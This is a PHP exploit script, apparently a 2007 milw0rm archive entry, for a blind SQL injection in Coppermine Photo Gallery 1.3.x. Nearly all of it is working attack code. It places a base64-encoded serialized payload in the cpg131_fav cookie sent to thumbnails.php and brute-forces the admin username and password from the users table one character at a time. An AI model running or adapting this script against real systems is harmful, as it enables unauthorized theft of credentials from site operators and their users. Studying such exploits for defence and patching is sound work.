<?
# Coppermine Photo Gallery 1.3.x Blind SQL Injection Exploit
# by s0cratex, RTM Member
# Visit: www.zonartm.org

/*
You need make a small work... Add a fav pic, enter to the site and add
/addfav.php?pid=2 for example..xD
... in the line: if(eregi("download",fgets($cnx2))){ $pass.=chr($i); echo
chr($i); break; }  }
the word "download" depends of the language...
*/

# saludos a rgod, OpTix, crypkey 'n mechas...

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

$host = "localhost"; $path = "/cpg"; $port = "80";
$id = "1";

echo "Coppermine Photo Gallery 1.3.x fav Blind SQL Injection Exploit\n";
echo "--------------------------------------------------------------\n";
echo "\n";
echo "Username -> ";
$j = 1; $user = "";
while(!strstr($user,chr(0))){
for($x=0;$x<255;$x++){
$xpl = "'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_name,".$j.",1))=".$x."),1,0)) FROM cpg131_users WHERE user_id=".$id.")/*";
$xpl = "a:1:{i:0;s:".strlen($xpl).":\"".$xpl."\";}";
$xpl = base64_encode($xpl);
$cnx = fsockopen($host,$port);
fwrite($cnx, "GET ".$path."/thumbnails.php?album=favpics HTTP/1.0\r\nCookie: cpg131_fav=".$xpl."\r\n\r\n");
while(!feof($cnx)){
if(eregi("download",fgets($cnx))){ $user.=chr($x); echo chr($x); break; }  }
fclose($cnx);
if ($x==255) {
die("\n Try again..."); }
}
$j++;
}
echo "\n";
echo "Password -> ";
$a = 1; $pass = "";
while(!strstr($pass,chr(0))){
for($i=0;$i<255;$i++){
$xpl = "'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_password,".$a.",1))=".$i."),1,0)) FROM cpg131_users WHERE user_id=".$id.")/*";
$xpl = "a:1:{i:0;s:".strlen($xpl).":\"".$xpl."\";}";
$xpl = base64_encode($xpl);
$cnx2 = fsockopen($host,$port);
fwrite($cnx2, "GET ".$path."/thumbnails.php?album=favpics HTTP/1.0\r\nCookie: cpg131_fav=".$xpl."\r\n\r\n");
while(!feof($cnx2)){
if(eregi("download",fgets($cnx2))){ $pass.=chr($i); echo chr($i); break; }
}
fclose($cnx2);
if ($i==255) {
die("\n Try again..."); }
}
$a++;
}
echo "--------------------------------------------------------------\n";
echo "s0cratex@zonartm.org || if you speak spanish->MSN: s0cratex@hotmail.com ..xD\n";
echo "www.zonartm.org/blog/s0cratex\n";
echo "plexinium.com comming soon <- Hacking Nica\n";
?>

# milw0rm.com [2007-02-24]
